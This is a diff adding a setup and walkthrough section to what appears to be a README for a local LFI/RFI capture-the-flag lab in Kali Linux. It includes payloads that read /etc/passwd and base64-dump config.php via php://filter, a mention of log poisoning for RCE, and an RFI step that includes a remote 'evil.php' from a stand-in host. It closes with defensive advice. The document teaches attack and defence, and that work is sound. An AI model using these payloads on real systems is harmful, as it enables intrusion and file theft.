@@ -212,15 +212,120 @@ wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc=404 "http://target.co
  This will find accessible files and possible LFI/RFI entry points.
 
 ---
+###  How to Run the LFI/RFI CTF Challenge in Kali Linux?  
 
-##  How to Stay Secure?
-- Sanitize user input (use `basename()` and `realpath()`).
-- Disable `allow_url_include` in `php.ini`:
-  ```ini
-  allow_url_include = Off
+Follow these steps to set up and run your LFI/RFI CTF challenge in Kali Linux:  
+
+---
+
+## 1️. Set Up a Local Web Server  
+Since the challenge is written in PHP, we need Apache and PHP.
+
+### Install Apache & PHP
+```bash
+sudo apt update
+sudo apt install apache2 php libapache2-mod-php -y
+```
+
+### Start Apache
+```bash
+sudo systemctl start apache2
+sudo systemctl enable apache2
+```
+
+### Verify Apache is Running
+```bash
+systemctl status apache2
+```
+
+---
+
+## 2️. Deploy the CTF Challenge
+Now, place the LFI/RFI CTF script inside Apache's web directory.
+
+### Move the Challenge File
+```bash
+sudo mv lfi_rfi_ctf.php /var/www/html/
+```
+
+### Set Proper Permissions
+```bash
+sudo chown www-data:www-data /var/www/html/lfi_rfi_ctf.php
+sudo chmod 644 /var/www/html/lfi_rfi_ctf.php
+```
+
+---
+
+## 3️. Access the Challenge
+Now, open your browser and go to:
+
+```
+http://localhost/lfi_rfi_ctf.php
+```
+
+You'll see the challenge page! 
+
+---
+
+## 4️. Exploiting LFI
+To test Local File Inclusion, try:
+
+```
+http://localhost/lfi_rfi_ctf.php?page=/etc/passwd
+```
+
+✔ If successful, you'll see the `/etc/passwd` file!  
+
+### Advanced LFI Techniques :
+- Use PHP Wrappers:  
   ```
-- Use web application firewalls (e.g., ModSecurity).
-- Monitor logs for suspicious requests.
+  ?page=php://filter/convert.base64-encode/resource=config.php
+  ```
+- Try Log Poisoning for RCE (if logs are accessible).
+
+---
+
+## 5️. Exploiting RFI
+To test Remote File Inclusion**, host a malicious PHP file (`evil.php`) on your server:
+
+```php
+<?php
+echo "Hacked! RFI Successful!";
+?>
+```
+
+Upload it to a public server (`http://yourserver.com/evil.php`) and execute:
+
+```
+http://localhost/lfi_rfi_ctf.php?rfi=http://yourserver.com/evil.php
+```
+
+If successful, it will execute your remote script
+
+---
+
+## 6️. Capture the Flag!
+Try accessing:
+
+```
+http://localhost/lfi_rfi_ctf.php?flag=getit
+```
+
+  If successful, you'll see the flag:  
+```
+CTF{LFI_RFI_OWNED}
+```
+
+---
+
+###  How to Secure Against LFI & RFI?
+1. Use Whitelist-based file inclusion.
+2. Disable `allow_url_include` in `php.ini`:
+   ```ini
+   allow_url_include = Off
+   ```
+3. Sanitize user input using `realpath()` and `basename()`.
+4. Use a Web Application Firewall (WAF).
 
 ---
 
